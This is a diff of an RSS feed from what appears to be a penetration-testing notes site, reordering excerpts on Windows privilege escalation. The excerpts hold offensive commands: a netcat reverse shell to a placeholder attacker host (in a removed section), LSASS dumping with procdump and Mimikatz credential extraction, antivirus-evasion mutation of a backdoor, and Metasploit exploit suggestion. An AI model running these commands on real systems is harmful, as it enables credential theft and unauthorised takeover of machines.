@@ -21,6 +21,15 @@ Sessions # Query DC to check about domain active sessions: net group “Domain C
     </item>
     
     <item>
+      <title>Tricks</title>
+      <link>/windows-systems/privilege-escalation/tricks/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/privilege-escalation/tricks/</guid>
+      <description>Global Tricks https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/ https://guif.re/windowseop https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html https://lolbas-project.github.io/# python3 gtfo -e Certutil.exe # You can feed syteminfo output to windows-exploit-suggester ./windows-exploit-suggester.py --update ./windows-exploit-suggester.py --database 2019-02-19-mssb.xls --systeminfo /home/xxx/Documents/Galactic/systeminfo.txt # Metasploit also has a module &amp;gt; use post/multi/recon/local_exploit_suggester msf5 post(multi/recon/local_exploit_suggester) &amp;gt; options Module options (post/multi/recon/local_exploit_suggester): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on SHOWDESCRIPTION false yes Displays a detailed description for the available exploits msf5 post(multi/recon/local_exploit_suggester) &amp;gt; set SESSION 1 SESSION =&amp;gt; 1 msf5 post(multi/recon/local_exploit_suggester) &amp;gt; run [*] 10.</description>
+    </item>
+    
+    <item>
       <title>LSASS and Mimikatz</title>
       <link>/windows-systems/privilege-escalation/lsass_mimikatz/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -28,15 +37,6 @@ Sessions # Query DC to check about domain active sessions: net group “Domain C
       <guid>/windows-systems/privilege-escalation/lsass_mimikatz/</guid>
       <description>LSASS # Avoiding running Mimikatz on the target can be a nice solution for stealth # You can just dump the LSASS process, get them and parse it locally procdump.exe -accepteula -ma lsass.exe lsass.dmp 
 Mimikatz # If you have an LSASS dump, you can use the minidump module mimikatz # sekurlsa::minidump lsass.DMP mimikatz # sekurlsa::logonPasswords /full # You can upload mimikatz to a remote machine with smbclient # Or you can use crackmapexec # Executon may fail but the binary will be uploaded in C:\\Windows\\mimikatz.</description>
-    </item>
-    
-    <item>
-      <title>Tricks</title>
-      <link>/windows-systems/privilege-escalation/tricks/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/windows-systems/privilege-escalation/tricks/</guid>
-      <description>Global Tricks https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/ https://guif.re/windowseop https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html https://lolbas-project.github.io/# python3 gtfo -e Certutil.exe # You can feed syteminfo output to windows-exploit-suggester ./windows-exploit-suggester.py --update ./windows-exploit-suggester.py --database 2019-02-19-mssb.xls --systeminfo /home/m***REMOVED***/Documents/Galactic/systeminfo.txt # Getting shell in limited interpreter system(&amp;#34;start cmd.exe /k $cmd&amp;#34;) # Reverse shell nc.exe attacker_ip attacker_port -e cmd.exe # From admin to SYSTEM psexec.exe -i -s %SystemRoot%\system32\cmd.exe # AV Bypass # You can generate mutated binary hyperion.exe ../backdoor.exe ../backdoor_mutation.exe # Download and exec powershell on target powershell.</description>
     </item>
     
     <item>
@@ -56,6 +56,15 @@ Mimikatz # If you have an LSASS dump, you can use the minidump module mimikatz #
       <guid>/windows-systems/privilege-escalation/privexchange/</guid>
       <description>Resources https://github.com/dirkjanm/PrivExchange https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/ https://chryzsh.github.io/exploiting-privexchange/ # After exploitation, you won&amp;#39;t be like Domain Admin directly, so, you won&amp;#39;t be able to connect to the # DC using Domain Admins rights. # Exploitation allows user to get DCSync privileges, which is enough to get the NTDS Database # You can then use Pass the Hash attack with administrators accounts to get real access 
 Aclpwn # ACLpwn is a tool used to find compromission paths inside BloodHound data and to exploit them # BloodHound need to be running # Many options are available # Dry option is used to look for compromission without exploiting it python aclpwn.</description>
+    </item>
+    
+    <item>
+      <title>DNSadmins group</title>
+      <link>/windows-systems/privilege-escalation/dnsadmins_group/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/privilege-escalation/dnsadmins_group/</guid>
+      <description>TODO</description>
     </item>
     
   </channel>
